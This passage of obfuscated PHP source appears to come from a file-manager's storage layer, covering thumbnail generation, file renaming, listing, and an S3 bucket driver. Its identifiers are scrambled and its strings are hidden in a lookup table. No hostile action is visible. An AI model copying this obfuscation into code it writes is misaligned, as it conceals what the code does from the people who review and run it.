ltrim($this->getPathOuter($ø§ÔÜ²), $îš¹È¸[8]) : $îš¹È¸[12]; $ËØ‹¹È• = $îš¹È¸[173] . $¯¯¼Ãää . $îš¹È¸[174] . rtrim($‹Ôô®Î, $îš¹È¸[8]); if (is_null($¯¯¼Ãää)) { $şğşœã = array(); return; } if (is_null($ø§ÔÜ²)) { foreach ($şğşœã as $ËØ‹¹È• => $«»…‘Â) { if (!strstr($ËØ‹¹È•, $îš¹È¸[173] . $¯¯¼Ãää . $îš¹È¸[175])) { continue; } unset($şğşœã[$ËØ‹¹È•]); } return; } if ($íŒŒâ´© === $îš¹È¸[176]) { unset($şğşœã[$ËØ‹¹È•]); return; } if (!is_null($íŒŒâ´©)) { $şğşœã[$ËØ‹¹È•] = $íŒŒâ´©; return; } $úÊÁü¸ = isset($şğşœã[$ËØ‹¹È•]) ? $şğşœã[$ËØ‹¹È•] : null; if (!is_null($úÊÁü¸)) { return $úÊÁü¸; } $úÊÁü¸ = $this->{$¯¯¼Ãää}($ø§ÔÜ²); $şğşœã[$ËØ‹¹È•] = $úÊÁü¸; return $úÊÁü¸; } public function cacheMethodInfoSet($‡ÄÑÈß¡, $²şÚÏüÊ, $ ¤’½Ã = false) { $ÁÊŸ…˜í =& $_SERVER[ïÃ°£«Ê]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ÁÊŸ…˜í[177], $‡ÄÑÈß¡, $²şÚÏüÊ); $this->cacheMethod($ÁÊŸ…˜í[178], $‡ÄÑÈß¡, $²şÚÏüÊ ? !1 : !0); if (is_array($ ¤’½Ã)) { $this->cacheMethod($ÁÊŸ…˜í[179], $‡ÄÑÈß¡, $ ¤’½Ã); } } public function fileOutImage($¥ğá‚Ä“, $óˆ®ıàŞ = 250) { $¸ïÕ£â½ =& $_SERVER[ïÃ°£«Ê]; set_timeout(); if (substr($¥ğá‚Ä“, 0, 4) == $¸ïÕ£â½[149]) { $this->fileOutLink($¥ğá‚Ä“); } $¾é–îÓÌ = $this->info($¥ğá‚Ä“); $ëéì×­ñ = !1; $‚£åÇ™ = isset($GLOBALS[$¸ïÕ£â½[180]]) ? $GLOBALS[$¸ïÕ£â½[180]] : array(); if ($‚£åÇ™ && $‚£åÇ™[$¸ïÕ£â½[181]] == $¾é–îÓÌ[$¸ïÕ£â½[87]]) { $¾é–îÓÌ = $‚£åÇ™; $ô’Ì±‘¹ = $¾é–îÓÌ[$¸ïÕ£â½[182]]; if ($ô’Ì±‘¹ && isset($ô’Ì±‘¹[$¸ïÕ£â½[183]])) { if ($ô’Ì±‘¹[$¸ïÕ£â½[183]] <= $óˆ®ıàŞ && $ô’Ì±‘¹[$¸ïÕ£â½[184]] <= $óˆ®ıàŞ) { $ëéì×­ñ = !0; } } } if ($¾é–îÓÌ[$¸ïÕ£â½[79]] <= 1024 * 50 || $ëéì×­ñ || !function_exists($¸ïÕ£â½[185]) || $¾é–îÓÌ[$¸ïÕ£â½[166]] == $¸ïÕ£â½[186]) { return $this->fileOut($¥ğá‚Ä“, !1, $¾é–îÓÌ[$¸ïÕ£â½[32]]); } $ÊÀ¢–ìÑ = kodIO::hashPath($¾é–îÓÌ); $ñ„à±µ­ = "\x63\157\166\x65\162\x5f{$ÊÀ¢–ìÑ}\137{$óˆ®ıàŞ}\x2e\x70\x6e\147"; $æÅËî˜» = IO_PATH_SYSTEM_TEMP . $¸ïÕ£â½[187]; $äŸ•¸¿« = IO::infoFullSimple($æÅËî˜»); $àç‰«®€ = $äŸ•¸¿« && is_array($äŸ•¸¿«) ? $äŸ•¸¿«[$¸ïÕ£â½[87]] : $¸ïÕ£â½[12]; if (!$àç‰«®€) { $àç‰«®€ = IO::mkdir($æÅËî˜»); } if ($¾é–îÓÌ[$¸ïÕ£â½[188]] == $¸ïÕ£â½[189] && isset($¾é–îÓÌ[$¸ïÕ£â½[190]]) && $¾é–îÓÌ[$¸ïÕ£â½[190]] == kodIO::sourceID($àç‰«®€)) { $Áé¬ö˜† = $¾é–îÓÌ[$¸ïÕ£â½[191]]; if ($óˆ®ıàŞ <= 500) { $Ûˆ°œÏÃ = preg_replace($¸ïÕ£â½[192], $¸ïÕ£â½[193], $¾é–îÓÌ[$¸ïÕ£â½[32]]); $Áé¬ö˜† = IO::fileNameExist($àç‰«®€, $Ûˆ°œÏÃ); } return IO::fileOut(KodIO::make($Áé¬ö˜†), !1, $¾é–îÓÌ[$¸ïÕ£â½[32]]); } $À€ÊğøÀ = IO::fileNameExist($àç‰«®€, $ñ„à±µ­); if ($À€ÊğøÀ) { return IO::fileOut(KodIO::make($À€ÊğøÀ), !1, $¾é–îÓÌ[$¸ïÕ£â½[32]]); } if ($óˆ®ıàŞ > 1000) { $this->makeImageCover($àç‰«®€, $¥ğá‚Ä“, $ñ„à±µ­, $óˆ®ıàŞ); $this->makeImageCover($àç‰«®€, $¥ğá‚Ä“, "\143\x6f\x76\145\x72\137{$ÊÀ¢–ìÑ}\137\x32\65\x30\56\x70\156\x67", 250); $À€ÊğøÀ = IO::fileNameExist($àç‰«®€, $ñ„à±µ­); if ($À€ÊğøÀ) { return IO::fileOut(KodIO::make($À€ÊğøÀ), !1, $¾é–îÓÌ[$¸ïÕ£â½[32]]); } die; } if (!kodIO::allowCover($¾é–îÓÌ)) { return $this->fileOut($¥ğá‚Ä“, !1, $¾é–îÓÌ[$¸ïÕ£â½[32]]); } $õãÒŒ = Cache::get($ñ„à±µ­); if ($õãÒŒ == $¸ïÕ£â½[194] || $õãÒŒ == $¸ïÕ£â½[195]) { echo $õãÒŒ; die; } Cache::set($ñ„à±µ­, $¸ïÕ£â½[195], 60); $…¢¯äÖ– = array($àç‰«®€, $¾é–îÓÌ[$¸ïÕ£â½[87]], $ñ„à±µ­, $óˆ®ıàŞ); $Ëç÷©®µ = $¸ïÕ£â½[196] . $¾é–îÓÌ[$¸ïÕ£â½[79]] . $¸ïÕ£â½[197] . $ñ„à±µ­ . $¸ïÕ£â½[198] . $¾é–îÓÌ[$¸ïÕ£â½[32]] . $¸ïÕ£â½[199] . $¾é–îÓÌ[$¸ïÕ£â½[87]]; TaskQueue::add($¸ïÕ£â½[200], $…¢¯äÖ–, $Ëç÷©®µ, $ñ„à±µ­); } public function makeImageCover($»ü¾¸ô, $…’ú±àê, $–î÷‡¾ä, $”Ñ»®Æ“) { $Àãç·÷Î =& $_SERVER[ïÃ°£«Ê]; if (IO::fileNameExist($»ü¾¸ô, $–î÷‡¾ä)) { return $Àãç·÷Î[201]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $íÉ‡ù™ = $this->getPathOuter($…’ú±àê); $¸³±ü¡¶ = DATA_THUMB . $–î÷‡¾ä; del_file($¸³±ü¡¶); $Å‰İøû¸ = IO::copy($íÉ‡ù™, TEMP_FILES, !1, $–î÷‡¾ä); if (!@file_exists($Å‰İøû¸)) { return $Àãç·÷Î[202]; } ImageThumb::createThumb($Å‰İøû¸, $¸³±ü¡¶, $”Ñ»®Æ“, $”Ñ»®Æ“ * 10); if (@file_exists($¸³±ü¡¶)) { Cache::remove($–î÷‡¾ä); return IO::move($¸³±ü¡¶, $»ü¾¸ô); } Cache::set($–î÷‡¾ä, $Àãç·÷Î[194], 600); del_file($¸³±ü¡¶); return $Àãç·÷Î[203] . $Å‰İøû¸ . $Àãç·÷Î[74]; } public function fileOutImageServer($äÌ±Í¨ˆ, $®ÕóØë = 250) { $this->fileOutImage($äÌ±Í¨ˆ, $®ÕóØë); } public function fileNameAuto($Û¦›Ö·Š, $ÏÛò¬Óğ, $Ñ’ı¾¾¿ = REPEAT_RENAME, $¿ÃûÁ„å = false) { $’Áî¹üğ =& $_SERVER[ïÃ°£«Ê]; $€ƒÂ½›¼ = $Û¦›Ö·Š === $’Áî¹üğ[12] ? $ÏÛò¬Óğ : rtrim($Û¦›Ö·Š, $’Áî¹üğ[8]) . $’Áî¹üğ[8] . $ÏÛò¬Óğ; if ($Ñ’ı¾¾¿ == REPEAT_REPLACE || !$this->exist($€ƒÂ½›¼) || $¿ÃûÁ„å && $Ñ’ı¾¾¿ != REPEAT_RENAME_FOLDER) { return $ÏÛò¬Óğ; } if ($Ñ’ı¾¾¿ == REPEAT_SKIP) { return !1; } $Ÿó¬ˆêÖ = $’Áî¹üğ[10] . get_path_ext($ÏÛò¬Óğ); $Ÿó¬ˆêÖ = $Ÿó¬ˆêÖ == $’Áî¹üğ[10] || $¿ÃûÁ„å ? $’Áî¹üğ[12] : $Ÿó¬ˆêÖ; $¢¦®•òÙ = 1; $şçôÆ· = substr($ÏÛò¬Óğ, 0, strlen($ÏÛò¬Óğ) - strlen($Ÿó¬ˆêÖ)); $õÁ´ ‘ = $şçôÆ· . "\50{$¢¦®•òÙ}\51{$Ÿó¬ˆêÖ}"; while ($this->exist(rtrim($Û¦›Ö·Š, $’Áî¹üğ[8]) . $’Áî¹üğ[8] . $õÁ´ ‘)) { $õÁ´ ‘ = $şçôÆ· . "\x28{$¢¦®•òÙ}\x29{$Ÿó¬ˆêÖ}"; $¢¦®•òÙ++; } return $õÁ´ ‘; } private function fileNameAutoList($„‹Œ˜¾ı, $Ôäƒµ, $äŞ®†‰· = false) { $Öò³ñÜ” =& $_SERVER[ïÃ°£«Ê]; $™”ß‹•— = $this->listPath($„‹Œ˜¾ı, !0); $™”ß‹•— = array_merge($™”ß‹•—[$Öò³ñÜ”[85]], $™”ß‹•—[$Öò³ñÜ”[86]]); $ß­ä€áÀ = array_to_keyvalue($™”ß‹•—, $Öò³ñÜ”[12], $Öò³ñÜ”[32]); $­ÊÍĞæ = $Öò³ñÜ”[10] . get_path_ext($Ôäƒµ); $­ÊÍĞæ = $­ÊÍĞæ == $Öò³ñÜ”[10] || $äŞ®†‰· ? $Öò³ñÜ”[12] : $­ÊÍĞæ; $şŠñ›Ç‡ = substr($Ôäƒµ, 0, strlen($Ôäƒµ) - strlen($­ÊÍĞæ)); $‡Àˆ†’¿ = $şŠñ›Ç‡ . "\x28\x30\51{$­ÊÍĞæ}"; for ($™­ÕŠ½Ã = 1; $™­ÕŠ½Ã <= count($ß­ä€áÀ) + 1; $™­ÕŠ½Ã++) { $‡Àˆ†’¿ = $şŠñ›Ç‡ . "\50{$™­ÕŠ½Ã}\51{$­ÊÍĞæ}"; if (!in_array_not_case($‡Àˆ†’¿, $ß­ä€áÀ)) { return $‡Àˆ†’¿; } } return $‡Àˆ†’¿; } public function listAllFiles($ëê­Ç£¤, $œëƒ°„¨) { $ÃşÑ¨ã =& $_SERVER[ïÃ°£«Ê]; if (empty($œëƒ°„¨)) { return array(); } $€ø‹É·÷ = array_keys($œëƒ°„¨); $¢îÖ´¨Ì = array(); $ëê­Ç£¤ = trim($ëê­Ç£¤, $ÃşÑ¨ã[8]); foreach ($œëƒ°„¨ as $å±¸ÁÑ­ => $Î¥ü¼Ş) { $Ü±•¹¡ù = ltrim(substr(trim($å±¸ÁÑ­, $ÃşÑ¨ã[8]), strlen($ëê­Ç£¤)), $ÃşÑ¨ã[8]); if (substr($å±¸ÁÑ­, -1) == $ÃşÑ¨ã[8]) { $Ü±•¹¡ù = rtrim($Ü±•¹¡ù, $ÃşÑ¨ã[8]) . $ÃşÑ¨ã[8]; } $¢îÖ´¨Ì = array_merge($¢îÖ´¨Ì, $this->slicePath($Ü±•¹¡ù)); } $€Ş¯ŞÄ = array(); foreach (array_unique($¢îÖ´¨Ì) as $İöçâÏœ) { $¥ÒÍÕËŠ = array($ÃşÑ¨ã[87] => $this->getPathOuter($ÃşÑ¨ã[8] . $ëê­Ç£¤ . $ÃşÑ¨ã[8] . $İöçâÏœ), $ÃşÑ¨ã[78] => 1, $ÃşÑ¨ã[79] => 0); if (substr($İöçâÏœ, -1) != $ÃşÑ¨ã[8]) { $¥ÒÍÕËŠ[$ÃşÑ¨ã[78]] = 0; $›Àê®… = $this->getPath($ëê­Ç£¤ . $ÃşÑ¨ã[8] . $İöçâÏœ); if (isset($œëƒ°„¨[$›Àê®…])) { $ˆ³ü°ãÄ = $œëƒ°„¨[$›Àê®…]; if (isset($ˆ³ü°ãÄ[$ÃşÑ¨ã[79]])) { $¥ÒÍÕËŠ[$ÃşÑ¨ã[79]] = intval($ˆ³ü°ãÄ[$ÃşÑ¨ã[79]]); } if (isset($ˆ³ü°ãÄ[$ÃşÑ¨ã[204]])) { $¥ÒÍÕËŠ[$ÃşÑ¨ã[88]] = intval($ˆ³ü°ãÄ[$ÃşÑ¨ã[204]]); } } } $€Ş¯ŞÄ[] = $¥ÒÍÕËŠ; } return $€Ş¯ŞÄ; } public function slicePath($ªÃõà„) { $Ûß¾É¯ =& $_SERVER[ïÃ°£«Ê]; $ö”¡ÈåÆ = explode($Ûß¾É¯[8], trim($ªÃõà„, $Ûß¾É¯[8])); $ŒÆÓİÄÓ = 0; do { ++$ŒÆÓİÄÓ; $Ì®÷¡—‰[] = implode($Ûß¾É¯[8], array_slice($ö”¡ÈåÆ, 0, $ŒÆÓİÄÓ)) . $Ûß¾É¯[8]; } while ($ŒÆÓİÄÓ < count($ö”¡ÈåÆ)); $Ì®÷¡—‰[count($ö”¡ÈåÆ) - 1] = $ªÃõà„; return $Ì®÷¡—‰; } public function getHost() { $â·°‘„ =& $_SERVER[ïÃ°£«Ê]; $ü“ìÁ¢Ú = parse_url(trim($this->domain, $â·°‘„[8])); $³šíÚà = isset($ü“ìÁ¢Ú[$â·°‘„[205]]) ? $ü“ìÁ¢Ú[$â·°‘„[205]] : http_type(); $ÚæÀˆËä = isset($ü“ìÁ¢Ú[$â·°‘„[206]]) ? $ü“ìÁ¢Ú[$â·°‘„[206]] : $ü“ìÁ¢Ú[$â·°‘„[87]]; if (isset($ü“ìÁ¢Ú[$â·°‘„[207]])) { $ÚæÀˆËä .= $â·°‘„[4] . $ü“ìÁ¢Ú[$â·°‘„[207]]; } return $³šíÚà . $â·°‘„[208] . $ÚæÀˆËä; } public function pathEncode($Äëè´É) { $¿†‘ÛÈ€ =& $_SERVER[ïÃ°£«Ê]; return str_replace($¿†‘ÛÈ€[209], $¿†‘ÛÈ€[8], rawurlencode($Äëè´É)); } public function writeLog($œª«¾È = '', $»Ğ¸³—ä = false) { $¯¤ãç =& $_SERVER[ïÃ°£«Ê]; $Í¦„ßÑ = in_array(ACTION, array($¯¤ãç[210], $¯¤ãç[211])); if (!$Í¦„ßÑ && !GLOBAL_DEBUG) { return; } $¯¿ó¯‹¯ = $œª«¾È; static $±¦¨± Æ = null; if (!$±¦¨± Æ) { $±¦¨± Æ = strtoupper($this->getType()); } $œª«¾È = $±¦¨± Æ . $¯¤ãç[212] . $œª«¾È; if ($»Ğ¸³—ä) { $„Åå®³ = error_get_last(); if ($„Åå®³) { $œª«¾È = array($œª«¾È, $„Åå®³); } } write_log($œª«¾È, $¯¤ãç[213]); if ($Í¦„ßÑ) { throw new Exception($¯¿ó¯‹¯); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($á„ì¦à¿) { set_timeout(); require_once SDK_DIR . $_SERVER[ïÃ°£«Ê][214]; parent::__construct(); $this->_init($á„ì¦à¿); } public function _init($Àöù—†Õ) { $íï©§Áù =& $_SERVER[ïÃ°£«Ê]; $this->config = $Àöù—†Õ; foreach ($Àöù—†Õ as $ßŒçÒÌ‰ => $Ğ¨Ğ¥‰) { if (isset($this->{$ßŒçÒÌ‰})) { $this->{$ßŒçÒÌ‰} = $Ğ¨Ğ¥‰; } } $this->endpoint = $Àöù—†Õ[$íï©§Áù[215]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $°½ˆğî = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($°½ˆğî, 0, 7) == $íï©§Áù[216]) { $°½ˆğî = $íï©§Áù[217] . substr($°½ˆğî, 7); } $this->client->setEndpoint($°½ˆğî); if (in_array(ACTION, array($íï©§Áù[210], $íï©§Áù[211]))) { $this->client->setExceptions(); } } public function setSignVersion($üàª£ˆî = "\x76\x34") { $this->signVer = $üàª£ˆî; $this->client->setSignVersion($üàª£ˆî); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $‡…¸É•Ï) { return null; } } public function isBucketCors() { $çŠ±‰Ó¹ =& $_SERVER[ïÃ°£«Ê]; $ò ış¬ = $this->getBucketCors(); if (!$ò ış¬ || !is_array($ò ış¬)) { return !1; } if (!is_array($ò ış¬[$çŠ±‰Ó¹[218]])) { $ò ış¬[$çŠ±‰Ó¹[218]] = explode($çŠ±‰Ó¹[50], $ò ış¬[$çŠ±‰Ó¹[218]]); } if ($ò ış¬[$çŠ±‰Ó¹[219]] != $çŠ±‰Ó¹[220] || !in_array($çŠ±‰Ó¹[220], $ò ış¬[$çŠ±‰Ó¹[218]])) { return !1; } $…’Ñ× = array_map($çŠ±‰Ó¹[221], $ò ış¬[$çŠ±‰Ó¹[222]]); if (!is_array($…’Ñ×)) { $…’Ñ× = array(); } $×ß‚şÀ„ = array($çŠ±‰Ó¹[223], $çŠ±‰Ó¹[224], $çŠ±‰Ó¹[225], $çŠ±‰Ó¹[226], $çŠ±‰Ó¹[227]); $ëå İ¹­ = array_diff($×ß‚şÀ„, $…’Ñ×); return empty($ëå İ¹­); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function setRegion($¡ÛÉãó) { return $this->client->setRegion($¡ÛÉãó); } public function mkfile($¹şÉô÷í, $®ö‡…Å = '', $åº‡ÜÎ† = REPEAT_RENAME) { $‘‰ñ½Ó£ = $this->setContent($¹şÉô÷í, $®ö‡…Å); if ($‘‰ñ½Ó£ !== !1) { return $this->getPathOuter($¹şÉô÷í); } return !1; } public function mkdir($ı‘¼¼“Ñ, $È×úØ»ë = REPEAT_SKIP) { $ÃÎ×³œÅ =& $_SERVER[ïÃ°£«Ê]; if (empty($ı‘¼¼“Ñ) && $ı‘¼¼“Ñ !== $ÃÎ×³œÅ[228]) { return !1; } if ($È×úØ»ë && $this->_isFolder($ı‘¼¼“Ñ)) { return $this->getPathOuter($ı‘¼¼“Ñ); } $ûğ™ñÊ¸ = $this->setContent($ı‘¼¼“Ñ, $ÃÎ×³œÅ[12], !0); if ($ûğ™ñÊ¸ !== !1) { return $this->getPathOuter($ı‘¼¼“Ñ); } return !1; } public function copyFile($î¤Äß½‰, $®ù…¬Í, $×«œ¸ßå = array()) { $°íí¶ =& $_SERVER[ïÃ°£«Ê]; $Ó™¨°¨ = $this->objectMeta($î¤Äß½‰); if (!$Ó™¨°¨) { return !1; } if ($Ó™¨°¨[$°íí¶[79]] <= 1024 * 1024 * 200) { $ı¦¾­ = $this->client->copyObject($this->bucket, $î¤Äß½‰, $this->bucket, $®ù…¬Í, $°íí¶[229], $×«œ¸ßå); } else { $ı¦¾­ = $this->client->multiCopyObject($this->bucket, $î¤Äß½‰, $this->bucket, $®ù…¬Í, $×«œ¸ßå); } $ı¦¾­ = $ı¦¾­ ? $this->getPathOuter($®ù…¬Í) : !1; return $ı¦¾­; } public function moveFile($‘¥ ˜Û, $ôÖÌËÕõ) { if ($this->copyFile($‘¥ ˜Û, $ôÖÌËÕõ)) { $this->delFile($‘¥ ˜Û); return $this->getPathOuter($ôÖÌËÕõ); } return !1; } public function delFile($¼ô÷Òï) { return $this->client->deleteObject($this->bucket, $¼ô÷Òï); } public function delFolder($çÁ£˜Ó) { $Ñ´Ù£ıŸ =& $_SERVER[ïÃ°£«Ê]; if (!$this->exist($çÁ£˜Ó)) { return !0; } $this->listItemCache = !1; $«œâ’©œ = $this->fileList($çÁ£˜Ó); $this->listItemCache = !0; $ ¶ÅÖ™² = trim($çÁ£˜Ó, $Ñ´Ù£ıŸ[8]) . $Ñ´Ù£ıŸ[8]; if (!empty($çÁ£˜Ó) && $çÁ£˜Ó !== $Ñ´Ù£ıŸ[228] && !in_array($ ¶ÅÖ™², $«œâ’©œ[$Ñ´Ù£ıŸ[85]])) { $«œâ’©œ[$Ñ´Ù£ıŸ[85]][] = $ ¶ÅÖ™²; } $–¸ù”® = $this->delByBatch($«œâ’©œ[$Ñ´Ù£ıŸ[86]]); if (!$–¸ù”®) { return !1; } $–¸ù”® = $this->delByBatch($«œâ’©œ[$Ñ´Ù£ıŸ[85]]); if (!$–¸ù”®) { return !1; } return $this->delFile($ ¶ÅÖ™²); } private function delByBatch($î«ÎÜ²§) { foreach (array_chunk($î«ÎÜ²§, 1000) as $ŞïÂÅÌ) { $»‡öâªÁ = $this->client->deleteObjects($this->bucket, $ŞïÂÅÌ); if (!$»‡öâªÁ) { return !1; } } return !0; } public function rename($îèµ¤ğø, $ª¹³øº—) { return $this->renameObject($îèµ¤ğø, $ª¹³øº—); } public function listPath($—‰ÛÖà, $õÒÌıª• = false) { $üŞºÔ³ë =& $_SERVER[ïÃ°£«Ê]; $‹ïÃÓŞ“ = $this->fileList($—‰ÛÖà, $üŞºÔ³ë[8], !0); foreach ($‹ïÃÓŞ“[$üŞºÔ³ë[85]] as $´âùÈ => $ÍÔø˜£“) { $‹ïÃÓŞ“[$üŞºÔ³ë[85]][$´âùÈ] = $this->folderInfo($ÍÔø˜£“, $õÒÌıª•, $ÍÔø˜£“); } foreach ($‹ïÃÓŞ“[$üŞºÔ³ë[86]] as $´âùÈ => $ÍÔø˜£“) { $‹ïÃÓŞ“[$üŞºÔ³ë[86]][$´âùÈ] = $this->fileInfo($ÍÔø˜£“[$üŞºÔ³ë[32]], $õÒÌıª•, $ÍÔø˜£“); } return $‹ïÃÓŞ“; } protected function infoChildren($¥ê¨ï»à, &$‡Šì¹ˆÒ) { $™ÑÅ¶ÇÒ =& $_SERVER[ïÃ°£«Ê]; $®û¿öì¾ = $this->fileList($¥ê¨ï»à, $™ÑÅ¶ÇÒ[12], !0); $‡Šì¹ˆÒ[$™ÑÅ¶ÇÒ[81]] += count($®û¿öì¾[$™ÑÅ¶ÇÒ[85]]); $‡Šì¹ˆÒ[$™ÑÅ¶ÇÒ[80]] += count($®û¿öì¾[$™ÑÅ¶ÇÒ[86]]); foreach ($®û¿öì¾[$™ÑÅ¶ÇÒ[86]] as $Œà˜ƒ¼) { if (!$Œà˜ƒ¼ || !$Œà˜ƒ¼[$™ÑÅ¶ÇÒ[79]]) { continue; } $‡Šì¹ˆÒ[$™ÑÅ¶ÇÒ[79]] += $Œà˜ƒ¼[$™ÑÅ¶ÇÒ[79]]; } } private function fileInfo($ÕÎµ•í, $áË €ùˆ = false, $×æ½á”š = array()) { $î½‚‡”ó =& $_SERVER[ïÃ°£«Ê]; $­Òàé°Ó = array($î½‚‡”ó[32] => $this->pathThis($ÕÎµ•í), $î½‚‡”ó[87] => $this->getPathOuter($ÕÎµ•í), $î½‚‡”ó[33] => $î½‚‡”ó[230], $î½‚‡”ó[166] => $this->ext($ÕÎµ•í), $î½‚‡”ó[79] => isset($×æ½á”š[$î½‚‡”ó[79]]) ? $×æ½á”š[$î½‚‡”ó[79]] : 0); if ($áË €ùˆ) { return $­Òàé°Ó; } $­Òàé°Ó[$î½‚‡”ó[231]] = $­Òàé°Ó[$î½‚‡”ó[88]] = 0; $­Òàé°Ó[$î½‚‡”ó[232]] = $­Òàé°Ó[$î½‚‡”ó[233]] = !0; if (empty($×æ½á”š)) { $×æ½á”š = $this->objectMeta($ÕÎµ•í); if (!$×æ½á”š) { return $­Òàé°Ó; } } if (isset($×æ½á”š[$î½‚‡”ó[234]]) && $×æ½á”š[$î½‚‡”ó[234]]) { $­Òàé°Ó[$î½‚‡”ó[235]] = $×æ½á”š[$î½‚‡”ó[234]]; } if (isset($×æ½á”š[$î½‚‡”ó[204]])) { $­Òàé°Ó[$î½‚‡”ó[88]] = $×æ½á”š[$î½‚‡”ó[204]]; } if (isset($×æ½á”š[$î½‚‡”ó[79]])) { $­Òàé°Ó[$î½‚‡”ó[79]] = $×æ½á”š[$î½‚‡”ó[79]]; } return $­Òàé°Ó; } private function folderInfo($Ğ•úŠ, $²Çáƒ Ø = false, $ä¸ûê¬‘ = array()) { $“ç”í¦¿ =& $_SERVER[ïÃ°£«Ê]; $ù¯ÈêÉ„ = array($“ç”í¦¿[32] => $this->pathThis($Ğ•úŠ), $“ç”í¦¿[87] => $this->getPathOuter($“ç”í¦¿[8] . $Ğ•úŠ), $“ç”í¦¿[33] => $“ç”í¦¿[78]); if ($²Çáƒ Ø) { return $ù¯ÈêÉ„; } $ù¯ÈêÉ„[$“ç”í¦¿[231]] = $ù¯ÈêÉ„[$“ç”í¦¿[88]] = 0; $ù¯ÈêÉ„[$“ç”í¦¿[232]] = $ù¯ÈêÉ„[$“ç”í¦¿[233]] = !0; if ($Ğ•úŠ == $“ç”í¦¿[12]) { return $ù¯ÈêÉ„; } if (empty($ä¸ûê¬‘)) { $ä¸ûê¬‘ = $this->objectMeta(trim($Ğ•úŠ, $“ç”í¦¿[8]) . $“ç”í¦¿[8]); } if (isset($ä¸ûê¬‘[$“ç”í¦¿[204]])) { $ù¯ÈêÉ„[$“ç”í¦¿[231]] = $ä¸ûê¬‘[$“ç”í¦¿[204]]; } return $ù¯ÈêÉ„; } private function fileList($½†‰Óú‰, $›Î°²À = '', $ë…ûÆ™¸ = 0) { $¢õ°åÔÖ =& $_SERVER[ïÃ°£«Ê]; $ùÕíñĞ = rtrim($½†‰Óú‰, $¢õ°åÔÖ[8]) . $¢õ°åÔÖ[8]; $ÉÈ§¸Î = $this->listObjs($ùÕíñĞ, null, null, $›Î°²À); if (!$ÉÈ§¸Î) { return array($¢õ°åÔÖ[85] => array(), $¢õ°åÔÖ[86] => array()); } $äà¼Æ†Û = $‚òœƒÆ‘ = array(); foreach ($ÉÈ§¸Î[$¢õ°åÔÖ[236]] as $Û­Â½—) { $Ø©ğ‰ã = $Û­Â½—[$¢õ°åÔÖ[32]]; if ($Ø©ğ‰ã == $ùÕíñĞ) { continue; } $¶Š’ñÊå = isset($Û­Â½—[$¢õ°åÔÖ[79]]) ? $Û­Â½—[$¢õ°åÔÖ[79]] : 0; $Ì‚©†Ÿè = $¶Š’ñÊå == 0 && substr($Ø©ğ‰ã, strlen($Ø©ğ‰ã) - 1, 1) == $¢õ°åÔÖ[8] ? !0 : !1; $this->cacheMethodInfoSet($Ø©ğ‰ã, $Ì‚©†Ÿè, $Û­Â½—); if ($Ì‚©†Ÿè) { $äà¼Æ†Û[] = $Ø©ğ‰ã; continue; } $‚òœƒÆ‘[] = $ë…ûÆ™¸ ? $Û­Â½— : $Ø©ğ‰ã; } foreach ($ÉÈ§¸Î[$¢õ°åÔÖ[237]] as $Û­Â½—) { $äà¼Æ†Û[] = $Û­Â½—[$¢õ°åÔÖ[32]]; $this->cacheMethodInfoSet($Û­Â½—[$¢õ°åÔÖ[32]], !0); } $this->cacheMethodInfoSet($½†‰Óú‰, !0); return array($¢õ°åÔÖ[85] => $äà¼Æ†Û, $¢õ°åÔÖ[86] => $‚òœƒÆ‘); } private function listObjs($šõ ²†, $Ì“ıéî = null, $€íåÓ† = null, $Ùáùˆ = null) { $ÇçèÅÌ  =& $_SERVER[ïÃ°£«Ê]; $šõ ²† = trim($šõ ²†, $ÇçèÅÌ [8]); $·´ ëæÃ = empty($šõ ²†) && $šõ ²† !== $ÇçèÅÌ [228] ? $ÇçèÅÌ [12] : $šõ ²† . $ÇçèÅÌ [8]; return $this->client->getBucket($this->bucket, $·´ ëæÃ, $Ì“ıéî, $€íåÓ†, $Ùáùˆ, !0); } public function has($¬şì´®¨, $èâÅÔ¾ = false, $İ‹çƒ¢È = true) { $ûñÎ˜¡ =& $_SERVER[ïÃ°£«Ê]; $¬şì´®¨ = trim($¬şì´®¨, $ûñÎ˜¡[8]); $åç´†Ì» = empty($¬şì´®¨) && $¬şì´®¨ !== $ûñÎ˜¡[228] ? $ûñÎ˜¡[12] : $¬şì´®¨ . $ûñÎ˜¡[8]; $óÖ‚²ò„ = null; $ÌïâÎ­ = 500; $ƒŠÅ¥¸„ = $ûñÎ˜¡[8]; $°óóÙ¬ü = $âÚ÷Üòƒ = array(); while (!0) { $ùäèáò = $this->listObjs($¬şì´®¨, $óÖ‚²ò„, $ÌïâÎ­, $ƒŠÅ¥¸„); if (!$ùäèáò) { break; } $óÖ‚²ò„ = $ùäèáò[$ûñÎ˜¡[238]]; $÷Ëşâ× = $ùäèáò[$ûñÎ˜¡[236]]; $İ–ÙŸİ° = $ùäèáò[$ûñÎ˜¡[237]]; if (empty($÷Ëşâ×) && empty($İ–ÙŸİ°)) { break; } if (count($÷Ëşâ×) == 1 && $÷Ëşâ×[0][$ûñÎ˜¡[32]] == $åç´†Ì») { break; } if ($èâÅÔ¾) { if (count($÷Ëşâ×)) { $÷Ëşâ× = array_column($÷Ëşâ×, $ûñÎ˜¡[32]); $°óóÙ¬ü = array_merge($°óóÙ¬ü, $÷Ëşâ×); } if (count($İ–ÙŸİ°)) { $İ–ÙŸİ° = array_column($İ–ÙŸİ°, $ûñÎ˜¡[32]); $âÚ÷Üòƒ = array_merge($âÚ÷Üòƒ, $İ–ÙŸİ°); } if ($óÖ‚²ò„ === null) { break; } continue; } if ($İ‹çƒ¢È) { if (!empty($÷Ëşâ×)) { if (count($÷Ëşâ×) > 1 || isset($÷Ëşâ×[0][$ûñÎ˜¡[32]]) && $÷Ëşâ×[0][$ûñÎ˜¡[32]] != $åç´†Ì») { return !0; } } } else { if (!empty($İ–ÙŸİ°)) { return !0; } } if ($óÖ‚²ò„ === null) { break; } } if 